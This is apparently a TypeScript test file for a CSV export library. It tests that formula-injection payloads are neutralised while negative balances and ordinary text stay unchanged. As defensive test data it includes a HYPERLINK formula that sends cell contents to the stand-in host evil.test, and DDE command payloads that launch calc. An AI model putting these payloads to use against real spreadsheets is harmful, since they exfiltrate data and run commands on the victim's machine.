import { describe, it, expect } from "vitest";
import { toCsv, stripFormulaGuard } from "@/lib/csv";

/**
 * CSV exports are opened in Excel/LibreOffice/Sheets by the owner, and almost
 * every string in them was typed by someone else — staff entering item and
 * supplier names, customers submitting names and remarks through the portal
 * and the public API. A value that begins with a formula trigger executes on
 * open, in the owner's session, against the owner's files.
 *
 * The second thing these tests protect is the accounting columns: the fix must
 * not turn negative balances into text, which would break SUM() and trade a
 * security bug for a silently wrong ledger.
 */

const one = (value: unknown) => toCsv([{ v: value }], [{ key: "v", label: "V" }]);
/** The single data cell, with the header row and trailing CRLF stripped. */
const cell = (value: unknown) => one(value).split("\r\n")[1];

describe("formula injection is neutralised", () => {
  it("guards each trigger character", () => {
    for (const trigger of ["=", "+", "@"]) {
      expect(cell(`${trigger}SUM(A1)`)).toBe(`'${trigger}SUM(A1)`);
    }
  });

  it("guards a leading tab or carriage return", () => {
    // Spreadsheets strip leading whitespace before deciding if a cell is a
    // formula, so these reach the evaluator just like a bare '='.
    expect(cell("\t=SUM(A1)")).toBe(`'\t=SUM(A1)`);
    // Only the CR case needs quoting — a bare CR would otherwise read as a
    // row terminator.
    expect(cell("\r=SUM(A1)")).toBe(`"'\r=SUM(A1)"`);
  });

  it("neutralises a data-exfiltration payload", () => {
    const payload = '=HYPERLINK("http://evil.test/?d="&A1,"Total")';
    const out = cell(payload);
    expect(out.startsWith(`"'=HYPERLINK`)).toBe(true);
  });

  it("neutralises a DDE command payload", () => {
    expect(cell(`=cmd|'/c calc'!A1`)).toBe(`'=cmd|'/c calc'!A1`);
  });

  it("neutralises the -1+ form that dodges an '=' only filter", () => {
    expect(cell(`-1+cmd|'/c calc'!A1`)).toBe(`'-1+cmd|'/c calc'!A1`);
  });

  it("guards a payload smuggled through a quoted field", () => {
    // Quoting alone is not a mitigation — Excel evaluates "=1+1" too — so the
    // guard must be applied before the quoting decision, not instead of it.
    const out = cell("=1+1,2");
    expect(out).toBe(`"'=1+1,2"`);
  });

  it("guards column headers too", () => {
    const csv = toCsv([], [{ key: "v" as never, label: "=EVIL()" }]);
    expect(csv.split("\r\n")[0]).toBe("'=EVIL()");
  });
});

describe("legitimate values are left alone", () => {
  it("does not touch a negative number", () => {
    // The regression that matters most: customer statements and margin
    // reports emit negative balances, and escaping them would break SUM().
    expect(cell("-1234.50")).toBe("-1234.50");
    expect(cell("-0.01")).toBe("-0.01");
    expect(cell("-1e5")).toBe("-1e5");
    expect(cell("+3")).toBe("+3");
    expect(cell(-1234.5)).toBe("-1234.5");
  });

  it("does not touch ordinary text", () => {
    expect(cell("Paracetamol 500mg")).toBe("Paracetamol 500mg");
    expect(cell("Batch #A-123")).toBe("Batch #A-123");
  });

  it("guards a phone number, which is what a spreadsheet wants anyway", () => {
    // '+91 98765 43210' is not a number, so it is guarded — and the guard is
    // exactly what stops Excel mangling it into something else.
    expect(cell("+91 98765 43210")).toBe("'+91 98765 43210");
  });

  it("still escapes quotes, commas and newlines", () => {
    expect(cell('He said "hi"')).toBe('"He said ""hi"""');
    expect(cell("a,b")).toBe('"a,b"');
    expect(cell("a\nb")).toBe('"a\nb"');
    expect(cell("a\rb")).toBe('"a\rb"');
  });

  it("renders null and undefined as empty", () => {
    expect(cell(null)).toBe("");
    expect(cell(undefined)).toBe("");
  });

  it("renders a Date as ISO", () => {
    expect(cell(new Date("2026-01-02T03:04:05.000Z"))).toBe("2026-01-02T03:04:05.000Z");
  });
});

describe("export and re-import round-trip", () => {
  it("returns the original value for every guarded case", () => {
    const values = [
      "=SUM(A1)",
      "+1+1",
      "@import",
      "-1+cmd|'/c calc'!A1",
      "+91 98765 43210",
      "\t=SUM(A1)",
      '=HYPERLINK("http://evil.test/?d="&A1,"x")',
    ];
    for (const v of values) {
      // What Papa.parse hands back is the unquoted field, so undo the CSV
      // quoting first, then the guard — the order the importer uses.
      let field = cell(v);
      if (field.startsWith('"')) field = field.slice(1, -1).replace(/""/g, '"');
      expect(stripFormulaGuard(field)).toBe(v);
    }
  });

  it("returns the original value for unguarded ones", () => {
    for (const v of ["-1234.50", "Paracetamol", "a,b", ""]) {
      let field = cell(v);
      if (field.startsWith('"')) field = field.slice(1, -1).replace(/""/g, '"');
      expect(stripFormulaGuard(field)).toBe(v);
    }
  });

  it("leaves an apostrophe that is part of the data", () => {
    // Only an apostrophe *followed by a trigger* was added by us. A name that
    // genuinely starts with one must survive import untouched.
    expect(stripFormulaGuard("'s Pharmacy")).toBe("'s Pharmacy");
    expect(stripFormulaGuard("'")).toBe("'");
    expect(stripFormulaGuard("O'Brien")).toBe("O'Brien");
  });

  it("is idempotent on a value that was never guarded", () => {
    expect(stripFormulaGuard(stripFormulaGuard("Paracetamol"))).toBe("Paracetamol");
  });
});
